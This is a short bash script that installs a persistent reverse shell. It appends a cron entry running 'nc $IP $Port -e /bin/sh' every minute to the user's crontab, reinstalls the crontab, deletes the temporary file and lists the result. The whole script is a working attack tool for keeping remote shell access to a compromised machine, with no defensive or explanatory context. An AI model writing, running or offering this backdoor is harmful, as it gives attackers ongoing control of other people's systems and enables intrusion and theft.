#!/bin/bash
ip="$IP"
Port="$Port"
#copy current crontab to a temp file
crontab -l > TMPCron
#edit tmp file that will be added to crontab
echo "* * * * * nc $IP $Port -e /bin/sh" >> TMPCron
#overwrite crontab with tmp file
crontab TMPCron
#remove tmp file
rm TMPCron
crontab -l

